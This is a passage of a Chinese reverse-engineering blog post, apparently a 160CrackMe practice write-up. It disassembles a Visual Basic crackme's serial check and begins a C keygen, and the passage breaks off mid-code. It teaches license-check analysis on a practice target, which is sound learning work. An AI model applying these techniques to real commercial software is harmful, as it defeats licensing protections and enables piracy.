<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |Start8 = NULL</span><br><span class="hljs-number">00404911</span>   .  8D8D 18FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xE8</span>]          <span class="hljs-comment">; |</span><br><span class="hljs-number">00404917</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |TMPend8 = 005446A4</span><br><span class="hljs-number">00404918</span>   .  8D55 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]          <span class="hljs-comment">; |</span><br>0040491B   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |TMPstep8 = 00530000</span><br>0040491C   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |Counter8 = NULL</span><br><span class="hljs-number">0040491D</span>   .  FF15 <span class="hljs-number">38104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarFo&gt;<span class="hljs-comment">; \__vbaVarForInit</span><br><span class="hljs-number">00404923</span>   .  8B35 <span class="hljs-number">80104000</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaSt&gt;<span class="hljs-comment">;  msvbvm60.__vbaStrVarVal</span><br><span class="hljs-number">00404929</span>   .  8B1D B4104000 <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">617</span>&gt;]  <span class="hljs-comment">;  msvbvm60.rtcLeftCharVar</span><br>0040492F   &gt;  85C0          <span class="hljs-keyword">test</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br><span class="hljs-number">00404931</span>   .  0F84 <span class="hljs-number">29010000</span> <span class="hljs-keyword">je</span> Andréna<span class="hljs-number">.</span>00404A60<br><span class="hljs-number">00404937</span>   .  8D45 BC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x44</span>]<br>0040493A   .  6A <span class="hljs-number">01</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x1</span><br>0040493C   .  8D4D 8C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x74</span>]<br>0040493F   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00404940</span>   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br><span class="hljs-number">00404941</span>   .  FFD3          <span class="hljs-keyword">call</span> <span class="hljs-built_in">ebx</span>                                 <span class="hljs-comment">;  msvbvm60.rtcLeftCharVar</span><br><span class="hljs-number">00404943</span>   .  8D55 8C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x74</span>]<br><span class="hljs-number">00404946</span>   .  8D45 B0       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x50</span>]<br><span class="hljs-number">00404949</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>0040494A   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>0040494B   .  FFD6          <span class="hljs-keyword">call</span> <span class="hljs-built_in">esi</span>                                 <span class="hljs-comment">;  msvbvm60.__vbaStrVarVal</span><br><span class="hljs-number">0040494D</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>0040494E   .  FF15 D8104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">581</span>&gt;]     <span class="hljs-comment">;  获取第一位数字转为浮点数以便后面计算</span><br><span class="hljs-number">00404954</span>   .  DD9D 34FFFFFF <span class="hljs-keyword">fstp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xCC</span>]<br>0040495A   .  8D4D 9C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>]<br><span class="hljs-number">0040495D</span>   .  8D55 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]<br><span class="hljs-number">00404960</span>   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br><span class="hljs-number">00404961</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-number">00404962</span>   .  C745 A4 <span class="hljs-number">01000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x5C</span>],<span class="hljs-number">0x1</span><br><span class="hljs-number">00404969</span>   .  C745 9C <span class="hljs-number">02000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>],<span class="hljs-number">0x2</span><br><span class="hljs-number">00404970</span>   .  FF15 AC104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaI4Var&gt;<span class="hljs-comment">;  msvbvm60.__vbaI4Var</span><br><span class="hljs-number">00404976</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00404977</span>   .  8D45 BC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x44</span>]<br>0040497A   .  8D4D B8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x48</span>]<br><span class="hljs-number">0040497D</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>0040497E   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>0040497F   .  FFD6          <span class="hljs-keyword">call</span> <span class="hljs-built_in">esi</span>                                 <span class="hljs-comment">;  msvbvm60.__vbaStrVarVal</span><br><span class="hljs-number">00404981</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00404982</span>   .  FF15 4C104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">631</span>&gt;]     <span class="hljs-comment">;  msvbvm60.rtcMidCharBstr</span><br><span class="hljs-number">00404988</span>   .  8BD0          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span><br>0040498A   .  8D4D B4       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4C</span>]<br><span class="hljs-number">0040498D</span>   .  FF15 BC104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaStrMo&gt;<span class="hljs-comment">;  msvbvm60.__vbaStrMove</span><br><span class="hljs-number">00404993</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /String = &quot;7&quot;</span><br><span class="hljs-number">00404994</span>   .  FF15 <span class="hljs-number">20104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">516</span>&gt;]     <span class="hljs-comment">; \转为ascii</span><br>0040499A   .  0FBFD0        <span class="hljs-keyword">movsx</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-number">0040499D</span>   .  <span class="hljs-number">8995</span> FCFCFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x304</span>],<span class="hljs-built_in">edx</span><br>004049A3   .  C785 7CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>],<span class="hljs-number">0x5</span><br>004049AD   .  DB85 FCFCFFFF <span class="hljs-keyword">fild</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x304</span>]<br>004049B3   .  DD9D F4FCFFFF <span class="hljs-keyword">fstp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x30C</span>]<br>004049B9   .  DD85 F4FCFFFF <span class="hljs-keyword">fld</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x30C</span>]<br>004049BF   .  DC85 34FFFFFF <span class="hljs-keyword">fadd</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xCC</span>]             <span class="hljs-comment">;  每一位字符ascii码加上第一位数字</span><br>004049C5   .  DD5D <span class="hljs-number">84</span>       <span class="hljs-keyword">fstp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]<br>004049C8   .  DFE0          <span class="hljs-keyword">fstsw</span> <span class="hljs-built_in">ax</span><br>004049CA   .  A8 <span class="hljs-number">0D</span>         <span class="hljs-keyword">test</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0xD</span><br>004049CC   .  0F85 FA1F0000 <span class="hljs-keyword">jnz</span> Andréna<span class="hljs-number">.</span>004069CC<br>004049D2   .  8D85 7CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>]<br>004049D8   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>004049D9   .  FF15 <span class="hljs-number">94104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">572</span>&gt;]     <span class="hljs-comment">;  msvbvm60.rtcHexBstrFromVar</span><br>004049DF   .  8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>004049E2   .  <span class="hljs-number">8985</span> 74FFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>],<span class="hljs-built_in">eax</span><br>004049E8   .  8D95 6CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x94</span>]<br>004049EE   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>004049EF   .  8D85 5CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>]<br>004049F5   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>004049F6   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>004049F7   .  C785 6CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x94</span>],<span class="hljs-number">0x8</span><br>00404A01   .  FF15 <span class="hljs-number">84104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarCa&gt;<span class="hljs-comment">;  msvbvm60.__vbaVarCat</span><br>00404A07   .  8BD0          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span><br>00404A09   .  8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00404A0C   .  FFD7          <span class="hljs-keyword">call</span> <span class="hljs-built_in">edi</span>                                 <span class="hljs-comment">;  msvbvm60.__vbaVarMove</span><br>00404A0E   .  8D4D B0       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x50</span>]<br>00404A11   .  8D55 B4       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4C</span>]<br>00404A14   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00404A15   .  8D45 B8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x48</span>]<br>00404A18   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00404A19   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00404A1A   .  6A <span class="hljs-number">03</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x3</span><br>00404A1C   .  FF15 9C104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaFreeS&gt;<span class="hljs-comment">;  msvbvm60.__vbaFreeStrList</span><br>00404A22   .  8D8D 6CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x94</span>]<br>00404A28   .  8D95 7CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>]<br>00404A2E   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00404A2F   .  8D45 8C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x74</span>]<br>00404<span class="hljs-built_in">A32</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00404A33   .  8D4D 9C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>]<br>00404A36   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00404A37   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00404A38   .  6A <span class="hljs-number">04</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x4</span><br>00404A3A   .  FF15 <span class="hljs-number">14104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaFreeV&gt;<span class="hljs-comment">;  msvbvm60.__vbaFreeVarList</span><br>00404A40   .  83C4 <span class="hljs-number">24</span>       <span class="hljs-keyword">add</span> <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x24</span><br>00404A43   .  8D95 08FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xF8</span>]<br>00404A49   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; /TMPend8 = NULL</span><br>00404A4A   .  8D85 18FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xE8</span>]          <span class="hljs-comment">; |</span><br>00404A50   .  8D4D DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]          <span class="hljs-comment">; |</span><br>00404A53   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |TMPstep8 = 005446A4</span><br>00404A54   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |Counter8 = 00530000</span><br>00404A55   .  FF15 C8104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarFo&gt;<span class="hljs-comment">; \__vbaVarForNext</span><br>00404A5B   .^ E9 CFFEFFFF   <span class="hljs-keyword">jmp</span> Andréna<span class="hljs-number">.</span>0040492F<br>00404A60   &gt;  8D55 CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00404A63   .  8D85 4CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xB4</span>]<br>00404A69   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; /var18 = NULL</span><br>00404A6A   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |var28 = 005446A4</span><br>00404A6B   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],Andréna<span class="hljs-number">.0040</span>&gt;<span class="hljs-comment">; |0817E747D7AFF7C7F82836D74RR7A7F7E7B7C7D826D81KE7B7C</span><br>00404A75   .  C785 4CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xB4</span>],<span class="hljs-number">0x8008</span>       <span class="hljs-comment">; |</span><br>00404A7F   .  FF15 5C104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarTs&gt;<span class="hljs-comment">; \__vbaVarTstEq</span><br></code></pre></div></td></tr></table></figure><p>继续分析发现问题，最后比较的字符串第一位基本都是081，但是获取的第一位数字最大就是9,最大的9（0x39)+9也才是42，怎么都不会是81。仔细查看发现是自己的思路出现问题了，刚才搜索字符串有许多的地方，而我直接断在第一个地方进行分析，第一个地方只获取第一位数字，而后面会获取前两位数字，这样就对了。</p><p>只看这里获取前两位数字的部分即可，其他关键计算与上面是一样的。</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">004064B3</span>   .  6A <span class="hljs-number">02</span>         <span class="hljs-built_in">push</span> <span class="hljs-number">0x2</span><br><span class="hljs-number">004064B5</span>   .  8D55 8C       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0x74</span>]<br><span class="hljs-number">004064B8</span>   .  <span class="hljs-number">51</span>            <span class="hljs-built_in">push</span> ecx<br><span class="hljs-number">004064B9</span>   .  <span class="hljs-number">52</span>            <span class="hljs-built_in">push</span> edx<br><span class="hljs-number">004064BA</span>   .  FFD3          call ebx                                 ;  msvbvm60.rtcLeftCharVar<br><span class="hljs-number">004064BC</span>   .  8D45 8C       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0x74</span>]<br><span class="hljs-number">004064BF</span>   .  8D4D B0       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0x50</span>]<br><span class="hljs-number">004064C2</span>   .  <span class="hljs-number">50</span>            <span class="hljs-built_in">push</span> eax<br><span class="hljs-number">004064C3</span>   .  <span class="hljs-number">51</span>            <span class="hljs-built_in">push</span> ecx<br><span class="hljs-number">004064C4</span>   .  FFD6          call esi                                 ;  msvbvm60.__vbaStrVarVal<br><span class="hljs-number">004064C6</span>   .  <span class="hljs-number">50</span>            <span class="hljs-built_in">push</span> eax<br><span class="hljs-number">004064C7</span>   .  FF15 D8104000 call dword ptr ds:[&lt;&amp;MSVBVM60.#<span class="hljs-number">581</span>&gt;]     ;  msvbvm60.rtcR8ValFromBstr<br><span class="hljs-number">004064CD</span>   .  DD9D 34FFFFFF fstp qword ptr ss:[ebp-<span class="hljs-number">0xCC</span>]<br></code></pre></div></td></tr></table></figure><p>那么只有一组是正确的对比字符串，经过上述分析可以知道，生成的字符串肯定是十六进制的值，查看字符串可以发现有许多的字符串其中不是十六进制值，比如第一组，很明显RR,KE不是十六进制数。</p><p><img src="/2021/08/16/160CrackMe-011/6.png"></p><p>分析发现只有一组数是全部都是十六进制的，那么这一组应该就是需要计算后并且比对的KEY了。下面可以开始写注册机了。</p><p><img src="/2021/08/16/160CrackMe-011/7.png"></p><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><p>首先是对于那个每一位字符需要加上的数字的判断，假设这个数字是X，那么第一位数字就是X的十位数，然后这个数+X等于81，可以用这种方法来进行计算。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getValue</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> a,b;<br><span class="hljs-keyword">char</span> c;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0x31</span>; i &lt; <span class="hljs-number">0x3A</span>; i++)<br>&#123;<br>a = <span class="hljs-number">0x81</span> - i;<br>b = a/<span class="hljs-number">10</span>;<br><span class="hljs-built_in">itoa</span>(b, &amp;c, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">if</span> ( c==i )<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, a);<br><span class="hljs-keyword">return</span> a;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>其实我这种方法不太严谨，应该是第一位等于X的十位，第二位等于X的个位，同时满足才行。</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-keyword">int</span> main()<br>&#123;<br><span class="hljs-keyword">int</span> a= getValue()<span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> key[] = &#123; <span class="hljs-number">0x81</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x7D</span>,<span 